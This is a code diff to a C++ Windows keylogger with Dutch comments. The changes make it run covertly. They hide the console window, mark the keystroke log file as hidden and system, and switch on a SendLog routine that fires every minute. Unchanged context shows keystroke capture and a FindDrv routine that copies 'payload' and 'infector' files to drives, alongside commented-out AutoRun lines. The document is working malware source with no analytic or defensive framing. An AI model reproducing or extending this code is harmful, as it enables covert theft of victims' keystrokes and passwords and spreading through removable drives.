@@ -27,34 +27,27 @@ char* GetUser() {
     return user;
 }
 
-char* CreateLog() {
+void CreateLog() {
     string username = GetUser();
     string filename = username + ".txt";
     string filename2 = "\\" + username + ".txt";
-    
 
     char saveLocation[MAX_PATH] = {0};
     SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, saveLocation);
 
     string filePath = string(saveLocation) + "\\" + filename;
-    SetFileAttributes(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
     fstream LogFile(filePath , fstream::app);
     SetFileAttributes(filePath.c_str(),FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
+    //std::cout << "file path in LOG: " << filePath.c_str() << std::endl;
     
-    //strcat(saveLocation, username.c_str());
-    //strcat(saveLocation, ".txt");
-    
-    char tempPath[MAX_PATH];
-    strcpy(tempPath, filePath.c_str());
-    strcat(tempPath, filename2.c_str());
-    std::cout << "path: " << tempPath << std::endl;
-    return tempPath;
+    return;
 }
 
 
 void LOG(string input, char* logFile) {
     string filePath = string(logFile);
-    SetFileAttributes(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+
+    
     
     fstream LogFile(filePath , fstream::app);
     //std::cout << "Halllo Ik copy nu hier!: " << logFile << std::endl;
@@ -67,6 +60,7 @@ void LOG(string input, char* logFile) {
 
 // voegt speciale toetsen toe aan een map
 bool SpecialKeys(int S_Key, char* logFile) {
+    //std::cout << "file path in Special: " << logFile << std::endl;
     static map<int, string> specialKeys = {
         {VK_SPACE, " "},
         {VK_RETURN, "\n"},
@@ -139,8 +133,6 @@ int KeyLogger(char* logFile)
     return 0;
 }
 
-
-
 int FindDrv(const char *drive)
 {
     char dirX[MAX_PATH];
@@ -161,7 +153,7 @@ int FindDrv(const char *drive)
     strcat(path, payload);
     strcpy(path2, buff.c_str());
     strcat(path2, infector);
-
+    
     //CreAut.open(dirX,std::ios_base::out);
     //CreAut<<"[AutoRun]" << std::endl;
     //CreAut<<"open=test.exe" << std::endl;
@@ -282,20 +274,32 @@ int SendLog() {
 
 int main()
 {   
-    //ShowWindow(GetConsoleWindow(), SW_HIDE);
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
     // zolang de keylogger niet wordt gestopt blijft hij lopen
     auto last_executed_time = std::chrono::steady_clock::now();
 
     //maak de log file aan
-    char* logFiledir = CreateLog();
+    CreateLog();
 
-    std::cout << "file path: " << logFiledir << std::endl;
+    //krijg path
+    string username = GetUser();
+    string filename = username + ".txt";
+    string filename2 = "\\" + username + ".txt";
+    
+    char saveLocation[MAX_PATH] = {0};
+    SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, saveLocation);
+    string filePath = string(saveLocation) + "\\" + filename;
+    char logFiledir[MAX_PATH];
+    strcpy(logFiledir, filePath.c_str());
+    
+    //std::cout << "file path in Main: " << logFiledir << std::endl;
 
     while (true) {
         auto current_time = std::chrono::steady_clock::now();
         auto elapsed_time = std::chrono::duration_cast<std::chrono::minutes>(current_time - last_executed_time).count();
         if (elapsed_time >= 1) {
-            //SendLog(); // voert de sendlog uit
+            SendLog(); // voert de sendlog uit
             last_executed_time = current_time;                        
         }
         Sleep(10);
